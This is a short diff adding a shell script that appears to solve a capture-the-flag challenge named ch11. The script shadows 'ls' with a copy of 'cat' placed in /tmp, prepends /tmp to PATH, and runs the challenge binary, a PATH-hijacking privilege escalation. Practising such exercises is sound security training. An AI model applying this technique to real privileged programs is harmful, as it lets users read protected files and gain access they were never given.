@@ -1,0 +1,4 @@
+cp /bin/cat /tmp
+mv /tmp/cat /tmp/ls
+export PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/opt/tools/checksec/
+./ch11
